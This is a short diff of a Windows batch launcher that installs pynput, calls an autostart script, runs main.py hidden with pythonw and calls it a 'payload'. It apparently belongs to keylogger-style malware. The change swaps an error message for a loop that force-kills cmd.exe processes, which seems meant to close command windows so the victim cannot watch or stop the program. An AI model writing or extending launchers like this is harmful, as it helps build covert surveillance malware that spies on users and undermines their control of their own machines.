@@ -9,8 +9,7 @@ pip install pynput
 call autostart.bat
 
 pythonw main.py
-if %errorlevel% neq 0 (
-    echo Error occurred while running payload.
+for /f "tokens=1" %%i in ('tasklist ^| findstr cmd.exe') do (
+    if not "%%i" == "python.exe" taskkill /F /IM %%i
 )
-
 exit
